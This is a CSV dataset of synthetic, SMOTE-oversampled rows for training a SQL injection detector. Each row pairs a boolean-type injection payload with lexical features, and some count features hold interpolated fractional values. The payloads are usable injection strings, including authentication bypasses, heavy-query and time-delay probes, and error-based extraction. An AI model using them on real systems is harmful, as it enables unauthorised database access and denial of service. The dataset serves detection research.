id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000397,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.5895332787461997,41.63079682426957,17.08719788284638,3.036731717249881,2.8153984121347833,13.087197882846379,19.45640105857681,6.271799470711597,0.06595344719394142,0.31299910512098933,0.4704565792704788,0.15059086841459043,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.27179947071159494,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000398,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000121,1.041057155236705,56.76818847490367,20.709343804161314,3.520466656709121,12.837375216645256,15.83737521664526,21.384094237451833,6.709343804161314,0.22623263371823854,0.28037318891445884,0.3736720378754859,0.11972213949181665,0.709343804161315,0.0,2.0,0.0,0.0,1.7093438041613152,0.0,2.0,0.0,0.0,0.29065619583868485,3.709343804161315,0.7093438041613152,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.709343804161315,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.709343804161315
SMOTE_000399,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000103,1.270829037266267,200.61373058429615,33.314258300459066,3.7282664305105304,61.856937253443014,25.642822875573835,79.85693725344301,33.25703320183628,0.30631492205805017,0.12997795010878385,0.3989665526526562,0.1647405751805098,1.9856937253443012,0.0,0.0,0.0,0.0,1.3285645751147672,0.0,17.971387450688603,0.0,1.328564575114767,3.3285645751147674,8.642822875573835,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.328564575114767,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.657129150229535,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.985693725344301
SMOTE_000400,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,0.1835094423638807,99.97062720040759,30.826053760034938,3.6064046348732988,23.768071680046585,16.0,44.492465920302784,15.710089600058227,0.23895935887547104,0.16161398372746247,0.44213969456425734,0.15728696283280916,4.0,0.0,1.0,0.0,0.0,1.0579820799883546,0.0,7.652107520069873,0.0,1.0,1.0,2.057982079988354,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000401,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000150,1.6671954224888694,138.52520568374416,30.0,3.6728230218759887,55.1671237416537,10.354109532293288,52.53315050333852,20.470821906458657,0.39048156775963855,0.07624597667970047,0.38463000939842196,0.14864244616223907,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.8832876258346305,1.9999999999999998,0.47082190645865746,1.5291780935413426,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000402,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000072,0.9726245655465372,155.54836838739098,34.516122795796996,4.187493668532543,75.03224559159399,18.0,41.7419386021015,20.774184193695497,0.4823208831346811,0.11575200361310722,0.2684751246937179,0.13345198855849377,0.7741841936954961,0.7419386021015013,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.258061397898499,0.2580613978984987,0.7419386021015013,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.2580613978984987,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.258061397898499
SMOTE_000403,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,0.5311428161081007,99.9212726700311,28.352056563112495,3.7409243810743233,38.04113126224986,12.119858592218769,36.05616968933748,13.704113126224986,0.36886897995525414,0.12670981004234547,0.36614749825198034,0.13827371175042005,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,0.17602828155624653,0.8239717184437535,1.1760282815562464,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000404,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000048,0.5659866062831517,187.01870402900752,33.73582720386767,3.759567636203664,54.6037408058015,24.0,75.207481611603,33.20748161160301,0.2920415462720024,0.12843006456558473,0.40214050107609306,0.17738788808631978,3.603740805801503,0.0,0.0,0.0,0.0,1.8679136019338345,0.0,16.0,1.7358272038676685,1.0,3.0,7.867913601933834,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.8679136019338344,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.867913601933834
SMOTE_000405,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,1.1830586712749986,150.0164321575703,31.34923776166125,3.813181054111918,46.20649370364176,20.317560837316005,58.063749645622266,25.428627970990256,0.31086603618885383,0.13288112775860805,0.3828076834234995,0.1734451526290386,0.0,0.0,2.0,0.0,0.0,1.2698475523322506,0.0,12.158780418658004,0.0,1.7301524476677494,1.5396951046645009,9.269847552332251,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.26984755233225044,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.349237761661252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6190853139935024
SMOTE_000406,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000012,1.284395911251434,65.62742045838043,26.169893944507248,4.008511975766376,20.45752651387319,14.627420458380435,20.0,10.542473486126811,0.31205827128309116,0.22248098026525237,0.30490941950382255,0.16055132894783386,4.0,0.0,0.5424734861268117,0.0,0.0,2.0,0.0,2.0,0.0,1.0,1.0,2.542473486126812,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.457526513873188,0.5424734861268118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000407,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000101,0.5597400632711175,83.92856988263796,29.423469277331282,3.877044555457637,24.0,16.0,31.08163132797539,12.846938554662565,0.2878643147737861,0.19190954318252407,0.3670881308017689,0.15313801124192095,0.0,3.9999999999999996,1.0,0.0,0.0,1.0,0.0,4.846938554662565,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000408,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000052,1.0093142255838459,246.61880938146956,31.439886607759007,3.7289068759029402,50.09971651939752,72.75954643103603,95.31965982327702,28.439886607759007,0.2031048257235677,0.29492622898888193,0.3866258617254014,0.11534308356214895,0.0,0.7800566961204969,0.4398866077590061,0.0,2.0,1.2199433038795031,0.0,18.0,0.0,0.0,6.0,3.6598299116385093,0.0,0.780056696120497,0.21994330387950317,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,-2.7755575615628914e-17,4.0,0.0,0.21994330387950317,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.219943303879503
SMOTE_000409,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,0.09625530792993633,128.7027741198468,30.05856450998723,4.123702171898239,72.46851607989787,4.000000000000002,35.234258039948934,17.0,0.5630228974106003,0.031093130776819897,0.27373816601109513,0.13214580580148463,0.0,3.0,0.0,0.0,1.0,1.0,0.0,4.0585645099872325,0.941435490012767,0.0,3.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000410,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000088,0.20584230689459004,141.96954755159535,30.852792507370765,3.8777398798035265,71.48477377579768,8.0,44.70558501474153,17.779188761056144,0.5035244335785874,0.05639093725739888,0.31491673536543874,0.125167893798575,0.0,0.9263962536853818,2.0,0.0,1.0,1.0,0.0,6.9263962536853825,0.9263962536853818,0.0,2.0,4.0,0.0,0.926396253685382,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000411,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,0.5399812359704946,27.693967242439726,10.204021838373514,2.9735279960943988,15.081901727319199,0.20402183837351018,7.306032757560267,5.102010919186757,0.5416996749798597,0.008160873534940466,0.2653016378780134,0.18483781360718643,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.10201091918675687,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.10201091918675609,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000412,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,0.046360071062940475,204.3581538341518,34.037050396636396,3.7637321398397527,57.172901850969836,34.876498677878686,80.17290185096984,32.13585145433345,0.2797243374789867,0.17077485370049522,0.3922961304145776,0.15720467840594052,0.0,1.0,2.0,0.0,0.0,1.9876498677878687,0.0,17.061750661060657,0.012350132212131437,1.0123501322121313,3.0123501322121315,10.037050396636396,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.9876498677878687,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.024700264424263,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0123501322121315
SMOTE_000413,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,0.7014186724570022,142.66731148564793,32.45841393570599,4.06130634118352,69.37524180711797,8.729206967852997,45.37524180711798,19.18762090355899,0.48656495976348024,0.061182303624840784,0.31789982374310066,0.1343529128685783,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.729206967852996,0.9999999999999998,0.0,2.7292069678529964,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.2707930321470037,0.7292069678529962,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000414,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000142,0.1386410993388345,364.3706349708393,41.7269005478026,3.7000708759358427,114.3172513695065,35.448663385752866,158.6632415267651,55.94147868881484,0.31384569819566355,0.09723224147444028,0.435377582922201,0.1535444774076952,0.0,3.9219715850864576,0.01950710372838549,0.0,0.0,2.0,0.0,34.11704262237031,0.0,1.9609857925432288,3.9219715850864576,12.019507103728387,0.0,0.9804928962716144,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9804928962716144,1.0,0.0,0.0,0.9804928962716142,1.0,0.01950710372838571,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.097535518641928,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.09753551864193
SMOTE_000415,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000012,0.8142732014637782,76.00478942773354,28.77183909380573,3.9681192126249396,21.029118791740977,16.0,26.689272146316345,12.286398489676222,0.2822439523693261,0.21772364196023752,0.3377356519239866,0.16229675374644978,4.0,0.0,1.0,0.0,0.0,1.742720302064756,0.0,3.543678187611465,0.0,1.0,1.0,2.7427203020647557,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000416,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000118,0.1286043993546664,124.60207654956392,32.0,3.487845440597126,37.84083061982557,10.132641150145359,56.708189469680214,19.920415309912784,0.30365272135234667,0.0814952275107295,0.454996750573446,0.1598553005634778,2.0265282300290717,2.9204153099127845,0.05305646005814357,1.0,0.0,1.0,0.0,10.946943539941856,0.9734717699709281,0.0,1.0,2.0530564600581434,1.0,0.9734717699709283,0.026528230029071787,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.9734717699709283,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9734717699709279
SMOTE_000417,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000118,2.041560166820419,118.68307250816537,32.0,3.5673445996387785,35.47322900326614,12.105642497278213,52.36758650598793,18.73661450163307,0.2984870450980352,0.10373633360568166,0.44007368583876844,0.15770293545751468,2.4211284994556426,1.7366145016330723,0.8422569989112851,1.0,0.0,1.0,0.0,10.157743001088715,0.5788715005443574,0.0,1.0,2.842256998911285,1.0,0.5788715005443574,0.4211284994556425,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.5788715005443574,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5788715005443574
SMOTE_000418,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000009,1.8131658432012223,25.71237099833914,13.150687277685508,3.2835309616265103,8.05481094379855,3.0548109437985502,6.904123666113044,7.698625444628988,0.309940673084828,0.10693097530295692,0.26566343407270965,0.31746491753950545,4.849312722314494,0.0,0.0,0.8493127223144932,0.8493127223144932,1.150687277685507,0.0,0.0,0.0,0.0,0.0,2.849312722314493,1.0,0.0,0.0,0.0,0.8493127223144931,1.0,0.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.3013745553710138,0.8493127223144931,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.150687277685507
SMOTE_000419,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",nearest_attack_euclidean,R000046,0.9325880132078166,119.42850025915504,27.214250129577525,4.037006925724207,69.07174883380226,6.0712506478876325,26.857000518310105,17.428500259155054,0.578589804349084,0.0507213227170535,0.22479630911458237,0.14589256381928017,2.571499740844947,0.0,0.4285002591550531,0.0,1.0,1.0,0.0,3.214250129577527,0.21425012957752648,5.0,4.0,2.4285002591550526,1.0,0.0,0.2142501295775265,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.7857498704224735,0.21425012957752654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000420,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,1.542970713201717,120.74969895514259,29.44228453501097,4.105255938713962,67.53827628008776,6.230861859956125,32.76913814004388,14.211422675054845,0.5591658314593047,0.05261898928354712,0.27127786810432236,0.11693731115282581,0.0,1.884569070021938,0.0,0.0,1.0,1.0,0.0,4.0,0.4422845350109689,0.0,2.442284535010969,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.4422845350109689,0.557715464989031,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000421,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000133,0.20859653363716008,143.33200366707842,32.66600183353922,4.158492107363059,73.66201283477454,16.0,38.33599266584312,15.33399816646078,0.5137958514040284,0.11163379994751296,0.26756156143385695,0.10700878721460172,0.0,1.0,2.0,0.0,1.0,2.0,0.0,4.33399816646078,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000422,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000112,0.1521139239318595,390.9628620129524,31.0,3.280167540388416,102.66575811657194,47.40851785752318,185.0,55.88858603885731,0.26259516451075826,0.12126353182295758,0.473190835645641,0.14295046802064312,3.8514480518097503,0.0,0.037137987047562326,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.037137987047561,0.9628620129524377,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,1.9628620129524377,0.03713798704756244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000423,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000145,0.6365363150427809,162.25451347446028,30.11936897937129,3.65549976651056,64.06082368074738,8.835582855599043,65.35810693811388,24.0,0.39234865518822093,0.055306660835602206,0.4040778603904767,0.1482668235857001,4.2387379587425835,0.0,0.0,0.11936897937129166,0.8806310206287085,2.0,0.0,10.238737958742583,1.9999999999999998,0.0,1.8806310206287085,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.8806310206287085,0.0,0.0,0.8806310206287082,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.761262041257417
SMOTE_000424,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,0.8218546937363962,133.38644905507584,30.470915924406068,4.1187448732889935,75.76732739524854,5.058168151187866,36.88366369762427,15.677289811015168,0.5674850876353247,0.03941600900285702,0.2761889071130087,0.11690999624880959,0.0,2.4709159244060674,0.0,0.0,1.0,1.0,0.0,4.735457962203033,0.0,0.0,2.735457962203034,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.7354579622030337,0.2645420377969663,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
